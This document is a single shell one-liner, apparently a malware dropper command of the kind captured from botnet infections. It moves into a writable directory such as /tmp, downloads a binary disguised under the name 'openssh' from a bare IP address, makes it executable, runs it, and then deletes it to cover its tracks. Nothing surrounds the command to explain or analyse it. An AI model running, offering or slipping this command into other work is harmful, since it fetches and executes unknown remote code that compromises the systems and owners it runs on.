cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.63.58.139/openssh; chmod +x openssh; ./openssh; rm -rf openssh
